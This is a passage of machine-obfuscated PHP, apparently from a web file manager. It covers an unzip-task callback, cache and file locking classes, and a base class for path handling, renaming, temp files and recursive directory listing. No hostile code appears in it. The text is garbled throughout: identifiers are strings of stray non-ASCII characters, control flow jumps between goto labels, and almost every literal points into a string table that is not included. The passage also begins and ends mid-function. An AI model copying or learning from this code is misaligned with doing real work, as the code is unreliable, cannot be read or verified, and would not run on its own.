$CÙﬁ˘¿≤á‚[$c«—‚‹ÇŒ¯[736]] = $b◊∂◊‰ÊÑ[$c«—‚‹ÇŒ¯[78]]; goto AóıËÒ ≈Œ; e°Áˆ∫∏”ø: } public function unzipAfter($aÉÜ∫áßΩô) { goto Eéì ÀÛ›ø; eàã“¨ÒÕ¢: $fÊ≈ü¯‹ﬁ≈ = IO::infoWithChildren($aÉÜ∫áßΩô); $a±ÖÉ«øûá = 0; $cÖ‘«ÈÿØ˜[$B±úãÔ…ÇË[1593]] = array($B±úãÔ…ÇË[1594] => $a±ÖÉ«øûá + 1, $B±úãÔ…ÇË[414] => $fÊ≈ü¯‹ﬁ≈[$B±úãÔ…ÇË[28]], $B±úãÔ…ÇË[76] => $fÊ≈ü¯‹ﬁ≈[$B±úãÔ…ÇË[76]], $B±úãÔ…ÇË[501] => $fÊ≈ü¯‹ﬁ≈[$B±úãÔ…ÇË[501]] ? $fÊ≈ü¯‹ﬁ≈[$B±úãÔ…ÇË[501]] : $fÊ≈ü¯‹ﬁ≈[$B±úãÔ…ÇË[76]]); goto dÖÿ–Ôô†ä; f¡Ë∂ˆö‘°: $this->update(); self::log($B±úãÔ…ÇË[1630] . json_encode(array($cÖ‘«ÈÿØ˜, $fÊ≈ü¯‹ﬁ≈))); goto F¥⁄åôÀçÏ; Eéì ÀÛ›ø: $B±úãÔ…ÇË =& $_SERVER[Öíæ€“”≠éÏË]; $cÖ‘«ÈÿØ˜ =& $this->task; $cÖ‘«ÈÿØ˜[$B±úãÔ…ÇË[1628]] = $B±úãÔ…ÇË[107]; goto eàã“¨ÒÕ¢; E∏È∫Ñ´Ó : $cÖ‘«ÈÿØ˜[$B±úãÔ…ÇË[1582]] = $B±úãÔ…ÇË[33]; $cÖ‘«ÈÿØ˜[$B±úãÔ…ÇË[1589]] = 0; $cÖ‘«ÈÿØ˜[$B±úãÔ…ÇË[736]] = $fÊ≈ü¯‹ﬁ≈[$B±úãÔ…ÇË[78]]; goto f¡Ë∂ˆö‘°; aﬂøü¬Ñó≈: $cÖ‘«ÈÿØ˜[$B±úãÔ…ÇË[1045]] = 0; $cÖ‘«ÈÿØ˜[$B±úãÔ…ÇË[1584]] = 0; $cÖ‘«ÈÿØ˜[$B±úãÔ…ÇË[1585]] = 0; goto E∏È∫Ñ´Ó ; dÖÿ–Ôô†ä: if ($fÊ≈ü¯‹ﬁ≈[$B±úãÔ…ÇË[29]] == $B±úãÔ…ÇË[193]) { $cÖ‘«ÈÿØ˜[$B±úãÔ…ÇË[1031]] = 1; } else { $cÖ‘«ÈÿØ˜[$B±úãÔ…ÇË[1031]] = $fÊ≈ü¯‹ﬁ≈[$B±úãÔ…ÇË[81]][$B±úãÔ…ÇË[79]]; } $cÖ‘«ÈÿØ˜[$B±úãÔ…ÇË[1033]] = $B±úãÔ…ÇË[33]; $cÖ‘«ÈÿØ˜[$B±úãÔ…ÇË[1586]] = 0; goto aﬂøü¬Ñó≈; F¥⁄åôÀçÏ: } public function nameParse($aóùˆé˘Ñç) { goto c∆ÛöæéÜ‘; fÆ⁄ÕëôÕç: $D§¨“ÜÌ†ñ = get_path_this($aóùˆé˘Ñç); if (strstr($D§¨“ÜÌ†ñ, $fÆ™ï£¬Ïï[95])) { $AñÙê‡Œ§ﬁ[$fÆ™ï£¬Ïï[1045]] += 1; $AñÙê‡Œ§ﬁ[$fÆ™ï£¬Ïï[1031]] += 1; } $AñÙê‡Œ§ﬁ[$fÆ™ï£¬Ïï[1582]] = $aóùˆé˘Ñç; goto céú∫¥›Ñ©; c∆ÛöæéÜ‘: $fÆ™ï£¬Ïï =& $_SERVER[Öíæ€“”≠éÏË]; $AñÙê‡Œ§ﬁ =& $this->task; if ($AñÙê‡Œ§ﬁ[$fÆ™ï£¬Ïï[1628]] == $fÆ™ï£¬Ïï[1103]) { $AñÙê‡Œ§ﬁ[$fÆ™ï£¬Ïï[1628]] = $fÆ™ï£¬Ïï[311]; $AñÙê‡Œ§ﬁ[$fÆ™ï£¬Ïï[1589]] = 0; $AñÙê‡Œ§ﬁ[$fÆ™ï£¬Ïï[736]] = 0; } goto fÆ⁄ÕëôÕç; céú∫¥›Ñ©: $this->update(); goto dßÍ‘ø”ú‹; dßÍ‘ø”ú‹: } } goto A¿◊‚°úˆè; C“«¨øÇÎ≈: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto EÔÁ„éÏíí; eﬂéÃ™Íã‘: self::$timeout = $D≥ôˆÍ⁄¯É[$e…µ‰á‹‰‚[818]] ? $D≥ôˆÍ⁄¯É[$e…µ‰á‹‰‚[818]] : 10; $c ¯√ÆõØâ = _get($GLOBALS[$e…µ‰á‹‰‚[6]], $e…µ‰á‹‰‚[819]); $F√¨ø†ÃÙÍ = $D≥ôˆÍ⁄¯É[$e…µ‰á‹‰‚[805]] ? $D≥ôˆÍ⁄¯É[$e…µ‰á‹‰‚[805]] : $e…µ‰á‹‰‚[193]; goto fÿœóú∑üê; EÔÁ„éÏíí: $e…µ‰á‹‰‚ =& $_SERVER[Öíæ€“”≠éÏË]; if (self::$handle) { return self::$handle; } $D≥ôˆÍ⁄¯É = $GLOBALS[$e…µ‰á‹‰‚[6]][$e…µ‰á‹‰‚[347]]; goto eﬂéÃ™Íã‘; fÿœóú∑üê: if ($F√¨ø†ÃÙÍ == $e…µ‰á‹‰‚[17] && $c ¯√ÆõØâ == $e…µ‰á‹‰‚[9]) { $F√¨ø†ÃÙÍ = $e…µ‰á‹‰‚[193]; } switch ($F√¨ø†ÃÙÍ) { case $e…µ‰á‹‰‚[808]: self::$handle = new CacheLockRedis(); break; case $e…µ‰á‹‰‚[809]: self::$handle = new CacheLockMemcached(); break; case $e…µ‰á‹‰‚[17]: self::$handle = new CacheLockDatabase(); break; case $e…µ‰á‹‰‚[193]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto CÒ–£ÓòÕË; CÒ–£ÓòÕË: } private static function key($fˆ•Ê÷•‡ù) { return $_SERVER[Öíæ€“”≠éÏË][820] . Cache::key($fˆ•Ê÷•‡ù); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($e≤ÿëá¯ôÃ = '') { self::$errorMsg = $e≤ÿëá¯ôÃ; } public static function lockGlobal($A∏âêø˜ºã, $CÛÈœïœ†≥) { return self::lock($A∏âêø˜ºã, $CÛÈœïœ†≥, !0); } public static function lock($aÔ‘˜œÆç∏, $eÖå£ñﬂàˆ = false, $C⁄öèÒÂ¯∂ = false) { goto fäø‚≥Ö™ ; cÈªÿ‚∑≈Ñ: if (!$C⁄öèÒÂ¯∂) { self::$lockItem[$Cƒí≠Õù’›] = !0; } return $e•±ª⁄‚ß‚; goto dáóîÊ¿‚Û; d¿ë¡‹ÖﬂÁ: $eÖå£ñﬂàˆ = $eÖå£ñﬂàˆ ? $eÖå£ñﬂàˆ : self::$timeout; $e•±ª⁄‚ß‚ = $AÓÀÜ•Ò≈à->lock($Cƒí≠Õù’›, $eÖå£ñﬂàˆ); if (!$e•±ª⁄‚ß‚) { $Eç≥‚»Èëü = "\154\x6f\x63\153\x20\145\162\x72\157\162\73\x6b\x65\171\x3d{$aÔ‘˜œÆç∏}\x3b\x74\x69\155\x65\x3d{$eÖå£ñﬂàˆ}\73" . self::$errorMsg . $b®¥¨ÚÎØØ[68] . get_caller_msg(); $eâÉãÕŸÒç = LNG($b®¥¨ÚÎØØ[821]) . "\50{$eÖå£ñﬂàˆ}\163\51\x2e" . LNG($b®¥¨ÚÎØØ[822]); $eâÉãÕŸÒç .= $b®¥¨ÚÎØØ[823]; if (is_string(self::$errorMsg) && self::$errorMsg) { $eâÉãÕŸÒç = $eâÉãÕŸÒç . $b®¥¨ÚÎØØ[824] . self::$errorMsg; } write_log($Eç≥‚»Èëü, $b®¥¨ÚÎØØ[825]); show_json($eâÉãÕŸÒç, !1); } goto cÈªÿ‚∑≈Ñ; fäø‚≥Ö™ : $b®¥¨ÚÎØØ =& $_SERVER[Öíæ€“”≠éÏË]; $AÓÀÜ•Ò≈à = self::init(); $Cƒí≠Õù’› = self::key($aÔ‘˜œÆç∏); goto d¿ë¡‹ÖﬂÁ; dáóîÊ¿‚Û: } public static function lockGet($AóÜ´¶–Éª) { $D¥Éëñ‚ÿ¢ = self::key($AóÜ´¶–Éª); if (self::$lockItem[$D¥Éëñ‚ÿ¢]) { return self::$lockItem[$D¥Éëñ‚ÿ¢]; } return self::init()->lockGet($D¥Éëñ‚ÿ¢); } public static function unlock($a£·´øÑàü) { $a’ààêá∏Á = self::key($a£·´øÑàü); self::$lockItem[$a’ààêá∏Á] = null; return self::init()->unlock($a’ààêá∏Á); } public static function unlockRuntime() { $F∞Êò÷â´® =& $_SERVER[Öíæ€“”≠éÏË]; $AúÈ˘√º‚È = self::init(); $cΩ„ÑºÜ¡ã = !1; foreach (self::$lockItem as $A—ÿ’•®Ñü => $E‰¨∏í¨ñ¿) { if (!$E‰¨∏í¨ñ¿) { continue; } $AúÈ˘√º‚È->unlock($A—ÿ’•®Ñü); if (!$cΩ„ÑºÜ¡ã) { $cΩ„ÑºÜ¡ã = !0; write_log($F∞Êò÷â´®[826] . $A—ÿ’•®Ñü . $F∞Êò÷â´®[68] . get_caller_msg(), $F∞Êò÷â´®[825]); continue; } write_log($F∞Êò÷â´®[826] . $A—ÿ’•®Ñü, $F∞Êò÷â´®[825]); } self::fileUnlockAll(); } public static function fileLock($Fœâ∫ã«ÚÉ) { goto dñà⁄ıÜû¶; f»Ñîπ∫õ¥: if (flock($a«ãµáØß·, LOCK_EX)) { return !0; } self::unlock($Fœâ∫ã«ÚÉ); show_json($FÒêÖ¥Æ¡ç[830], !1); goto B®êÆÊ€òâ; dñà⁄ıÜû¶: $FÒêÖ¥Æ¡ç =& $_SERVER[Öíæ€“”≠éÏË]; if (!$GLOBALS[$FÒêÖ¥Æ¡ç[827]]) { $GLOBALS[$FÒêÖ¥Æ¡ç[827]] = array(); } $GLOBALS[$FÒêÖ¥Æ¡ç[827]][$Fœâ∫ã«ÚÉ] = !1; goto Aæ…Ø°ã‡Ï; Aæ…Ø°ã‡Ï: $a«ãµáØß· = fopen(DATA_PATH . $Fœâ∫ã«ÚÉ . $FÒêÖ¥Æ¡ç[828], $FÒêÖ¥Æ¡ç[829]); if (!$a«ãµáØß·) { return !1; } $GLOBALS[$FÒêÖ¥Æ¡ç[827]][$Fœâ∫ã«ÚÉ] = $a«ãµáØß·; goto f»Ñîπ∫õ¥; B®êÆÊ€òâ: return !1; goto Dæü≤Ãƒ∆≥; Dæü≤Ãƒ∆≥: } public static function fileUnlock($FÖä©´ﬂá®) { $fÑÏŒ¬⁄≠û =& $_SERVER[Öíæ€“”≠éÏË]; $BΩü◊√ÕÓ… = $GLOBALS[$fÑÏŒ¬⁄≠û[827]][$FÖä©´ﬂá®]; if (!$BΩü◊√ÕÓ…) { return; } $GLOBALS[$fÑÏŒ¬⁄≠û[827]][$FÖä©´ﬂá®] = !1; flock($BΩü◊√ÕÓ…, LOCK_UN); fclose($BΩü◊√ÕÓ…); } public static function fileUnlockAll() { $fÉÔ»±Àˆ– =& $_SERVER[Öíæ€“”≠éÏË]; if (!$GLOBALS[$fÉÔ»±Àˆ–[827]]) { return; } foreach ($GLOBALS[$fÉÔ»±Àˆ–[827]] as $f∏øöíŒÏí => $f¡€í⁄Ã™¢) { if (!$f¡€í⁄Ã™¢) { continue; } $GLOBALS[$fÉÔ»±Àˆ–[827]][$f∏øöíŒÏí] = !1; flock($f¡€í⁄Ã™¢, LOCK_UN); fclose($f¡€í⁄Ã™¢); } $GLOBALS[$fÉÔ»±Àˆ–[827]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $A«ƒè∞‰çÍ =& $_SERVER[Öíæ€“”≠éÏË]; $fö•·πå«¨ = $GLOBALS[$A«ƒè∞‰çÍ[6]][$A«ƒè∞‰çÍ[347]]; self::$cachePath = $fö•·πå«¨[$A«ƒè∞‰çÍ[193]][$A«ƒè∞‰çÍ[76]]; @mkdir(self::$cachePath, 511, !0); } public function lock($dÈí»…£‹È, $b÷˘¨Ñ€•∑ = 0) { goto fì§Ø∑∆∂∞; fì§Ø∑∆∂∞: $CÏø∂ö•◊ˆ =& $_SERVER[Öíæ€“”≠éÏË]; $B≤ÒèâŸê• = microtime(!0); $B•Ì¿£—„ = $B≤ÒèâŸê• + $b÷˘¨Ñ€•∑ + 0.0001; goto DÖ÷€ë §Î; DÖ÷€ë §Î: $DÎöº√Òƒ = rtrim(self::$cachePath, $CÏø∂ö•◊ˆ[8]) . $CÏø∂ö•◊ˆ[831] . md5($dÈí»…£‹È) . $CÏø∂ö•◊ˆ[828]; if (file_exists($DÎöº√Òƒ) && filemtime($DÎöº√Òƒ) && filemtime($DÎöº√Òƒ) < time() - 10) { @unlink($DÎöº√Òƒ); } do { if (file_exists($DÎöº√Òƒ)) { cacheLockWait(); continue; } $BƒÉ≈…ø≠» = fopen($DÎöº√Òƒ, $CÏø∂ö•◊ˆ[832]); if (!$BƒÉ≈…ø≠») { return !1; } $AâÆ∞àøŸÌ = flock($BƒÉ≈…ø≠», LOCK_EX | LOCK_NB); self::$caches[$dÈí»…£‹È] = array($CÏø∂ö•◊ˆ[833] => $BƒÉ≈…ø≠», $CÏø∂ö•◊ˆ[193] => $DÎöº√Òƒ); fwrite($BƒÉ≈…ø≠», $B•Ì¿£—„); clearstatcache(); if ($BƒÉ≈…ø≠» && $AâÆ∞àøŸÌ) { return !0; } cacheLockWait(); } while (microtime(!0) < $B•Ì¿£—„); goto aËµÚ√âõç; aËµÚ√âõç: $this->unlock($dÈí»…£‹È); return !1; goto CÆäΩœŸÃÊ; CÆäΩœŸÃÊ: } public function lockGet($f»©µ‘íÉË) { $Eå·Ú£ıÓ¶ =& $_SERVER[Öíæ€“”≠éÏË]; $bÔüﬂ˘ı“Î = rtrim(self::$cachePath, $Eå·Ú£ıÓ¶[8]) . $Eå·Ú£ıÓ¶[831] . md5($f»©µ‘íÉË) . $Eå·Ú£ıÓ¶[828]; return file_exists($bÔüﬂ˘ı“Î); } public function unlock($B˜ÚÕÛ¨ÿÃ) { goto F‹ÚèëñÈÌ; F‹ÚèëñÈÌ: $Bæ¬Ú†¿∞í =& $_SERVER[Öíæ€“”≠éÏË]; $BÖ®ø•±≠» = self::$caches[$B˜ÚÕÛ¨ÿÃ]; if (!$BÖ®ø•±≠») { return; } goto e≈≠ÎπÇå‡; e≈≠ÎπÇå‡: @flock($BÖ®ø•±≠»[$Bæ¬Ú†¿∞í[833]], LOCK_UN); @fclose($BÖ®ø•±≠»[$Bæ¬Ú†¿∞í[833]]); @unlink($BÖ®ø•±≠»[$Bæ¬Ú†¿∞í[193]]); goto e¡ÍÀÍÈ¢‰; e¡ÍÀÍÈ¢‰: unset(self::$caches[$B˜ÚÕÛ¨ÿÃ]); goto D∆åüÊ ËÚ; D∆åüÊ ËÚ: } } goto aäﬂéã¬…’; a≠ñ”êûëô: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $aÀ®à˜ñØÌ =& $_SERVER[Öíæ€“”≠éÏË]; $this->objectDriver = array($aÀ®à˜ñØÌ[57], $aÀ®à˜ñØÌ[58], $aÀ®à˜ñØÌ[59], $aÀ®à˜ñØÌ[60], $aÀ®à˜ñØÌ[61], $aÀ®à˜ñØÌ[62], $aÀ®à˜ñØÌ[63], $aÀ®à˜ñØÌ[64], $aÀ®à˜ñØÌ[65]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($D◊éÜπÛÚÌ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($D◊éÜπÛÚÌ, $_SERVER[Öíæ€“”≠éÏË][8]); } return $D◊éÜπÛÚÌ; } public function iconvApp($dƒÍëŸÁ∑¿) { return $dƒÍëŸÁ∑¿; } public function iconvSystem($EÁ•ÌÑº€™) { return $EÁ•ÌÑº€™; } public function iconvTo($Aƒ”ãÜ∆‹, $f›â˜≤›àÆ, $A™íË…”) { goto b“Ç√≤◊ﬁå; eæ∞ûÜƒ±Ó: $fˆ–¥∫π´· = $fˆ–¥∫π´· ? $fˆ–¥∫π´· : $Aƒ”ãÜ∆‹; if (strstr($fˆ–¥∫π´·, $Eë‰‹‡ŒÍΩ[70])) { $fˆ–¥∫π´· = str_replace($Eë‰‹‡ŒÍΩ[70], $Eë‰‹‡ŒÍΩ[71], $fˆ–¥∫π´·); } $Dß› ¨øµÕ[$f›â˜≤›àÆ . $Eë‰‹‡ŒÍΩ[67] . $A™íË…” . $Eë‰‹‡ŒÍΩ[68] . $Aƒ”ãÜ∆‹] = $fˆ–¥∫π´·; goto f«Ω∏Á≠áÂ; Có‡’î⁄É∂: $DêÈ∂Îçí· = $f›â˜≤›àÆ . $Eë‰‹‡ŒÍΩ[67] . $A™íË…” . $Eë‰‹‡ŒÍΩ[68] . $Aƒ”ãÜ∆‹; if (isset($Dß› ¨øµÕ[$DêÈ∂Îçí·])) { return $Dß› ¨øµÕ[$DêÈ∂Îçí·]; } if (function_exists($Eë‰‹‡ŒÍΩ[69])) { $fˆ–¥∫π´· = @mb_convert_encoding($Aƒ”ãÜ∆‹, $A™íË…”, $f›â˜≤›àÆ); } else { $fˆ–¥∫π´· = @iconv($f›â˜≤›àÆ, $A™íË…”, $Aƒ”ãÜ∆‹); } goto eæ∞ûÜƒ±Ó; f«Ω∏Á≠áÂ: $Dß› ¨øµÕ[$A™íË…” . $Eë‰‹‡ŒÍΩ[67] . $f›â˜≤›àÆ . $Eë‰‹‡ŒÍΩ[68] . $Aƒ”ãÜ∆‹] = $Aƒ”ãÜ∆‹; $Dß› ¨øµÕ[$A™íË…” . $Eë‰‹‡ŒÍΩ[67] . $f›â˜≤›àÆ . $Eë‰‹‡ŒÍΩ[68] . $fˆ–¥∫π´·] = $Aƒ”ãÜ∆‹; $Dß› ¨øµÕ[$f›â˜≤›àÆ . $Eë‰‹‡ŒÍΩ[67] . $A™íË…” . $Eë‰‹‡ŒÍΩ[68] . $fˆ–¥∫π´·] = $fˆ–¥∫π´·; goto båî≤‹áÀ; båî≤‹áÀ: return $fˆ–¥∫π´·; goto cÏç£ôÒıÈ; b“Ç√≤◊ﬁå: $Eë‰‹‡ŒÍΩ =& $_SERVER[Öíæ€“”≠éÏË]; if (!$Aƒ”ãÜ∆‹ || !function_exists($Eë‰‹‡ŒÍΩ[66])) { return $Aƒ”ãÜ∆‹; } static $Dß› ¨øµÕ = array(); goto Có‡’î⁄É∂; cÏç£ôÒıÈ: } public function getPathInner($aÉ‰¡ﬂçÖÁ) { $FÙ‹Æ•¿—ˆ = IO::init($aÉ‰¡ﬂçÖÁ); return $FÙ‹Æ•¿—ˆ->path; } public function getPathOuter($d∫èÒ˜¡ﬁ¢) { $DÆ¥è”ûÉ≠ =& $_SERVER[Öíæ€“”≠éÏË]; $eÙÿπ≤çœ = strlen(trim($this->pathBase, $DÆ¥è”ûÉ≠[8])); $d∫èÒ˜¡ﬁ¢ = substr(trim($d∫èÒ˜¡ﬁ¢, $DÆ¥è”ûÉ≠[8]), $eÙÿπ≤çœ); return $this->pathDriver . $DÆ¥è”ûÉ≠[8] . ltrim($d∫èÒ˜¡ﬁ¢, $DÆ¥è”ûÉ≠[8]); } public function isParentOf($Fù±Ì£îﬂî, $Aˆñ·∫£°∑) { $B∆±úÔÇÃá =& $_SERVER[Öíæ€“”≠éÏË]; $Fù±Ì£îﬂî = rtrim(strtolower($Fù±Ì£îﬂî), $B∆±úÔÇÃá[8]) . $B∆±úÔÇÃá[8]; $Aˆñ·∫£°∑ = rtrim(strtolower($Aˆñ·∫£°∑), $B∆±úÔÇÃá[8]) . $B∆±úÔÇÃá[8]; $b± ‘Ó¨êè = strpos($Aˆñ·∫£°∑, $Fù±Ì£îﬂî) === 0; return $b± ‘Ó¨êè; } public function getType() { $C≤ÏÎ˜Áºï =& $_SERVER[Öíæ€“”≠éÏË]; $e∆ã∫•◊Ú’ = str_replace($C≤ÏÎ˜Áºï[72], $C≤ÏÎ˜Áºï[33], get_class($this)); return strtolower($e∆ã∫•◊Ú’); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($B•ûÇ÷µ∑ì, $FÊ´áõ≤´µ) { $C¶ËÁìÃ‡– =& $_SERVER[Öíæ€“”≠éÏË]; $A›πΩé÷Ûê = rtrim($B•ûÇ÷µ∑ì, $C¶ËÁìÃ‡–[8]) . $C¶ËÁìÃ‡–[8] . $FÊ´áõ≤´µ; $b‹ü¯ç§÷à = $this->exist($A›πΩé÷Ûê); return $b‹ü¯ç§÷à ? $A›πΩé÷Ûê : !1; } public function setModifyTime($d∆π±⁄ÚèÚ, $EéóìäÕ√Ö = '') { } public function renameObject($Aœóµûü˘«, $aÜ∆Çà„∑Ò) { goto fí‘û∞óªå; fí‘û∞óªå: $CÆåÖÆ‚≤« =& $_SERVER[Öíæ€“”≠éÏË]; $cÔË´ôé›¡ = $aÜ∆Çà„∑Ò; Hook::trigger($CÆåÖÆ‚≤«[73], $this, $Aœóµûü˘«, $this, $this->pathFather($Aœóµûü˘«) . $aÜ∆Çà„∑Ò); goto bÇåÂ∞⁄⁄ÿ; bÇåÂ∞⁄⁄ÿ: $Aœóµûü˘« = $this->getPathOuter($Aœóµûü˘«); $aÜ∆Çà„∑Ò = $this->pathFather($Aœóµûü˘«) . $aÜ∆Çà„∑Ò; if (IO::isFile($Aœóµûü˘«)) { $bÕ«ãÿ€†Ë = IO::copy($Aœóµûü˘«, $this->pathFather($Aœóµûü˘«), REPEAT_RENAME_FOLDER, $cÔË´ôé›¡); if ($bÕ«ãÿ€†Ë) { IO::remove($Aœóµûü˘«); } } else { $bÕ«ãÿ€†Ë = IO::mkdir($aÜ∆Çà„∑Ò); if (!$bÕ«ãÿ€†Ë) { return !1; } $CƒÙÒï·Ò’ = IO::listPath($Aœóµûü˘«, !0); $bÛ≠∫≥˘û∂ = array_merge($CƒÙÒï·Ò’[$CÆåÖÆ‚≤«[74]], $CƒÙÒï·Ò’[$CÆåÖÆ‚≤«[75]]); foreach ($bÛ≠∫≥˘û∂ as $fÚ¢Õºﬂ∆¥) { IO::move($fÚ¢Õºﬂ∆¥[$CÆåÖÆ‚≤«[76]], $aÜ∆Çà„∑Ò, REPEAT_RENAME_FOLDER); } IO::remove($Aœóµûü˘«); } goto e…ê≥É⁄â€; e…ê≥É⁄â€: return $bÕ«ãÿ€†Ë ? $aÜ∆Çà„∑Ò : !1; goto b…®£áÕ™»; b…®£áÕ™»: } public function tempFile($Aüüçâ•≠ô = '', $eë©√∏ê”À = '') { goto d∏“©ÕÏÓá; c‘œËùôü : $a∏€äµøÉÆ = $Eõ…•ãåªÜ . $Aüüçâ•≠ô; @touch($a∏€äµøÉÆ); if ($eë©√∏ê”À) { file_put_contents($a∏€äµøÉÆ, $eë©√∏ê”À); } goto Büøÿåâ÷¯; Büøÿåâ÷¯: return $a∏€äµøÉÆ; goto câ¥ç”ÑÓè; d∏“©ÕÏÓá: if (!$Aüüçâ•≠ô) { $Aüüçâ•≠ô = rand_string(15); } $Eõ…•ãåªÜ = TEMP_FILES . rand_string(15) . $_SERVER[Öíæ€“”≠éÏË][8]; @mkdir($Eõ…•ãåªÜ, 511, !0); goto c‘œËùôü ; câ¥ç”ÑÓè: } public function tempFileRemve($EÀ°Ï«ÒõŒ) { @unlink($EÀ°Ï«ÒõŒ); @rmdir($this->pathFather($EÀ°Ï«ÒõŒ)); } public function mkfile($d…›øﬁÜ∞ì, $D°Õ–∫†ﬁÌ = '', $cæ·∫√ÇŒ‡ = REPEAT_RENAME) { } public function mkdir($d⁄›øºó‚±, $EëøÃ©âˆº = REPEAT_SKIP) { } public function delFile($fƒüäãìîŸ) { } public function delFolder($c®‹Ò¬Œ‚Ø) { } public function copyFile($e¯ßãûµ»∫, $Eõ• ö»çî) { } public function moveFile($B⁄Ê«¿æÈ°, $Aø»Ñ–ì˘¯) { } public function remove($bèœ¿ï“Éì) { if ($this->isFile($bèœ¿ï“Éì)) { return $this->delFile($bèœ¿ï“Éì); } return $this->delFolder($bèœ¿ï“Éì); } public function rename($B·ºù“áÖ†, $dôèª√í∑Æ) { } public function exist($b«´¨ÂªΩ) { } public function findByHash($b∑–ÙÑõ¥ = '', $FêµÑÒˆˆÌ = '') { return !1; } public function isFile($d®√µ–Œôº) { } public function isFolder($eÏáÑê‹·ö) { } public function size($C»Ò®õîôã) { } public function info($eÑ≥ÚáÁˆ›) { } public function infoSimple($aƒƒ–¯ßç’) { return $this->info($aƒƒ–¯ßç’); } public function infoAuth($b⁄‰Ìëõ«Ø) { return $this->info($b⁄‰Ìëõ«Ø); } public function infoFull($Aá»—∏ü¢º) { return $this->info($Aá»—∏ü¢º); } public function infoWithChildren($eÑó◊Ñ€÷°) { $a‹œêÊãöù =& $_SERVER[Öíæ€“”≠éÏË]; static $dÓ¬®É⁄àà = array(); if (isset($dÓ¬®É⁄àà[$eÑó◊Ñ€÷°])) { return $dÓ¬®É⁄àà[$eÑó◊Ñ€÷°]; } $E◊¡±Óô±é = $this->info($eÑó◊Ñ€÷°); if ($E◊¡±Óô±é && $E◊¡±Óô±é[$a‹œêÊãöù[29]] == $a‹œêÊãöù[77]) { $fû∫´≠ú“≠ = array($a‹œêÊãöù[78] => 0, $a‹œêÊãöù[79] => 0, $a‹œêÊãöù[80] => 0); $this->infoChildren($eÑó◊Ñ€÷°, $fû∫´≠ú“≠); $E◊¡±Óô±é[$a‹œêÊãöù[78]] = $fû∫´≠ú“≠[$a‹œêÊãöù[78]]; $E◊¡±Óô±é[$a‹œêÊãöù[81]] = array($a‹œêÊãöù[82] => $fû∫´≠ú“≠[$a‹œêÊãöù[79]], $a‹œêÊãöù[83] => $fû∫´≠ú“≠[$a‹œêÊãöù[80]]); $dÓ¬®É⁄àà[$eÑó◊Ñ€÷°] = $E◊¡±Óô±é; } return $E◊¡±Óô±é; } public function listPath($BÏ‚î∆èå∏, $BÈ◊õ∂±Úä = false) { } public function has($déª£∆»òœ, $FíáúÑ˘èÇ = false, $d–˘ÜÙ‰√ÿ = false) { } public function canRead($B°⁄Ã™ï¨ç) { } public function canWrite($C´ˆï€»©í) { } public function getContent($b´®õëçµ) { } public function setContent($FÑûü¢·ıπ, $F®—∞ôë∏’ = '') { } protected function infoChildren($b†ßÇè«‘Ñ, &$bΩõë€ÃŸ∑) { $dòñÉÊ¶Æ° =& $_SERVER[Öíæ€“”≠éÏË]; check_abort_echo(); $C≤éñ≥áæÉ = $this->listPath($b†ßÇè«‘Ñ, !0); $C≤éñ≥áæÉ = array_merge($C≤éñ≥áæÉ[$dòñÉÊ¶Æ°[75]], $C≤éñ≥áæÉ[$dòñÉÊ¶Æ°[74]]); foreach ($C≤éñ≥áæÉ as $D˜˘‚£Ùªã) { if ($D˜˘‚£Ùªã[$dòñÉÊ¶Æ°[29]] == $dòñÉÊ¶Æ°[77]) { $bΩõë€ÃŸ∑[$dòñÉÊ¶Æ°[80]]++; $FéÖüÑ÷Úß = $this->getPathInner($D˜˘‚£Ùªã[$dòñÉÊ¶Æ°[76]]); $this->infoChildren($FéÖüÑ÷Úß, $bΩõë€ÃŸ∑); } else { $bΩõë€ÃŸ∑[$dòñÉÊ¶Æ°[79]]++; $bΩõë€ÃŸ∑[$dòñÉÊ¶Æ°[78]] += $D˜˘‚£Ùªã[$dòñÉÊ¶Æ°[78]]; } } } public function fileSubstr($Dæπ¢çîûÌ, $DÂüÑ∫˜Ùà, $c£√Ûú«¢É) { } public function listAll($b≥îıâàÜÉ) { } public function listAllMake($cﬂ•ÈÀÕ‚∫, &$BæèèÎôâŸ) { $Dˆ‹˘ˆ∂èﬂ =& $_SERVER[Öíæ€“”≠éÏË]; check_abort_echo(); $A¶∆≠´Ò˜Ø = $this->listPath($cﬂ•ÈÀÕ‚∫, !0); if (!$A¶∆≠´Ò˜Ø) { return; } $B¡±¢Æï€ò = array_merge($A¶∆≠´Ò˜Ø[$Dˆ‹˘ˆ∂èﬂ[75]], $A¶∆≠´Ò˜Ø[$Dˆ‹˘ˆ∂èﬂ[74]]); foreach ($B¡±¢Æï€ò as $aéëÿàÿã∑) { goto D»µáÍË∂…; D»µáÍË∂…: $eõì„¢√∞» = $aéëÿàÿã∑[$Dˆ‹˘ˆ∂èﬂ[29]] == $Dˆ‹˘ˆ∂èﬂ[77]; $dÎ—ä∑ìÇÖ = array($Dˆ‹˘ˆ∂èﬂ[76] => $aéëÿàÿã∑[$Dˆ‹˘ˆ∂èﬂ[76]], $Dˆ‹˘ˆ∂èﬂ[77] => $eõì„¢√∞»); if (isset($aéëÿàÿã∑[$Dˆ‹˘ˆ∂èﬂ[78]])) { $dÎ—ä∑ìÇÖ[$Dˆ‹˘ˆ∂èﬂ[78]] = $aéëÿàÿã∑[$Dˆ‹˘ˆ∂èﬂ[78]]; } goto D¿ÚèÑî«; D¿ÚèÑî«: if (isset($aéëÿàÿã∑[$Dˆ‹˘ˆ∂èﬂ[84]])) { $dÎ—ä∑ìÇÖ[$Dˆ‹˘ˆ∂èﬂ[84]] = $aéëÿàÿã∑[$Dˆ‹˘ˆ∂èﬂ[84]]; } if (!$eõì„¢√∞») { $BæèèÎôâŸ[] = $dÎ—ä∑ìÇÖ; continue; } $BæèèÎôâŸ[] = $dÎ—ä∑ìÇÖ; goto DµÁµ¢¶≠€; DµÁµ¢¶≠€: $this->listAllMake($aéëÿàÿã∑[$Dˆ‹˘ˆ∂èﬂ[76]], $BæèèÎôâŸ); goto eªÔ‹ø≠Òê; eªÔ‹ø≠Òê: } } public function 